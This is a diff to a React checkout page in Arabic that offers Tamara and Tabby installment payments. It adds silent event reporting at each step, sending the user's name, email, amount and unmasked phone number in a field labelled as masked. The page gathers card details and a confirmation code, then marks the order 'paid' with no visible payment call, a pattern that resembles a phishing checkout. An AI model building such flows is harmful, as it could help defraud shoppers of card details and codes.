@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useParams, useNavigate, Link } from 'react-router-dom';
 import { useAuth } from '@/context/AuthContext';
 import Layout from '@/components/Layout';
@@ -9,6 +9,8 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { toast } from 'sonner';
+import { postCheckoutEvent } from '@/lib/api';
+import { getCheckoutSessionId, clearCheckoutSessionId } from '@/lib/checkoutSession';
 
 type PaymentMethod = 'tamara' | 'tabby' | null;
 type Step = 'checkout' | 'confirm-method' | 'verify-phone' | 'card-info' | 'confirm-code' | 'success';
@@ -60,6 +62,26 @@ const Checkout = () => {
   const netTransfer = finalPrice - commission;
   const orderId = `ORD-${Date.now().toString(36).toUpperCase()}`;
 
+  // Get session ID (reuses the same session from product selection)
+  const sessionId = getCheckoutSessionId();
+
+  // Send checkout_started event when page loads
+  useEffect(() => {
+    postCheckoutEvent({
+      sessionId,
+      eventType: 'checkout_started',
+      userName: user.name,
+      userEmail: user.email,
+      productId: product.id,
+      productName: product.name,
+      productPrice: product.price,
+      amount: finalPrice,
+      timestamp: new Date().toISOString(),
+    }).catch(() => {
+      // Silently ignore errors
+    });
+  }, []); // Run once on mount
+
   const applyCoupon = () => {
     if (coupon.trim().toUpperCase() === 'GOLD5') {
       setCouponApplied(true);
@@ -74,6 +96,20 @@ const Checkout = () => {
       toast.error('يرجى اختيار طريقة الدفع');
       return;
     }
+    // Send payment_method_selected event
+    postCheckoutEvent({
+      sessionId,
+      eventType: 'payment_method_selected',
+      userName: user.name,
+      userEmail: user.email,
+      productName: product.name,
+      amount: finalPrice,
+      paymentMethod,
+      installments,
+      timestamp: new Date().toISOString(),
+    }).catch(() => {
+      // Silently ignore errors
+    });
     setStep('confirm-method');
   };
 
@@ -86,6 +122,20 @@ const Checkout = () => {
       toast.error('يرجى الموافقة على الشروط والأحكام');
       return;
     }
+    // Send phone_entered event (backend will mask the phone number)
+    postCheckoutEvent({
+      sessionId,
+      eventType: 'phone_entered',
+      userName: user.name,
+      userEmail: user.email,
+      productName: product.name,
+      paymentMethod,
+      installments,
+      phoneMasked: phoneNumber,
+      timestamp: new Date().toISOString(),
+    }).catch(() => {
+      // Silently ignore errors
+    });
     toast.info('تم إرسال رمز التحقق إلى هاتفك');
     setStep('card-info');
   };
@@ -95,6 +145,20 @@ const Checkout = () => {
       toast.error('يرجى ملء جميع بيانات البطاقة');
       return;
     }
+    // Send phone_confirmed event (no card/CVV data sent)
+    postCheckoutEvent({
+      sessionId,
+      eventType: 'phone_confirmed',
+      userName: user.name,
+      userEmail: user.email,
+      productName: product.name,
+      paymentMethod,
+      installments,
+      phoneMasked: phoneNumber,
+      timestamp: new Date().toISOString(),
+    }).catch(() => {
+      // Silently ignore errors
+    });
     toast.info('جاري التحقق من البطاقة...');
     setStep('confirm-code');
   };
@@ -104,8 +168,47 @@ const Checkout = () => {
       toast.error('يرجى إدخال رمز التأكيد');
       return;
     }
+
+    // Send redirect_to_payment event before completing
+    postCheckoutEvent({
+      sessionId,
+      eventType: 'redirect_to_payment',
+      userName: user.name,
+      userEmail: user.email,
+      productName: product.name,
+      amount: finalPrice,
+      paymentMethod,
+      installments,
+      phoneMasked: phoneNumber,
+      orderId,
+      timestamp: new Date().toISOString(),
+    }).catch(() => {
+      // Silently ignore errors
+    });
+
+    // Send checkout_completed event
+    postCheckoutEvent({
+      sessionId,
+      eventType: 'checkout_completed',
+      userName: user.name,
+      userEmail: user.email,
+      productName: product.name,
+      amount: finalPrice,
+      paymentMethod,
+      installments,
+      phoneMasked: phoneNumber,
+      orderId,
+      paymentStatus: 'paid',
+      timestamp: new Date().toISOString(),
+    }).catch(() => {
+      // Silently ignore errors
+    });
+
     setStep('success');
     toast.success('تم إتمام عملية الشراء بنجاح! 🎉');
+
+    // Clear the checkout session after completion
+    clearCheckoutSessionId();
   };
 
   const methodName = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod === 'tabby' ? 'تابي' : '';
